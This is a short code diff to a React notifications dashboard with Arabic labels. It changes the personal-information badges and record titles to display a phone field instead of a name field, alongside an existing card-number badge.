@@ -544,11 +544,11 @@ export default function NotificationsPage() {
                     <td className="px-4 py-3">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.name ? "default" : "destructive"}
+                          variant={notification?.phone ? "default" : "destructive"}
                           className="rounded-md cursor-pointer"
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
-                          {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          {notification?.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
@@ -641,7 +641,7 @@ export default function NotificationsPage() {
                   <CardContent className="p-4">
                     <div className="flex justify-between items-start mb-3">
                       <div>
-                        <div className="font-semibold">{notification.personalInfo?.name || "غير معروف"}</div>
+                        <div className="font-semibold">{notification?.phone || "غير معروف"}</div>
                       </div>
                       <div className="flex items-center gap-2">
                         <FlagColorSelector
@@ -656,7 +656,7 @@ export default function NotificationsPage() {
                     <div className="grid grid-cols-1 gap-3 mb-3">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.name ? "default" : "destructive"}
+                          variant={notification?.phone ? "default" : "destructive"}
                           className="rounded-md cursor-pointer"
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
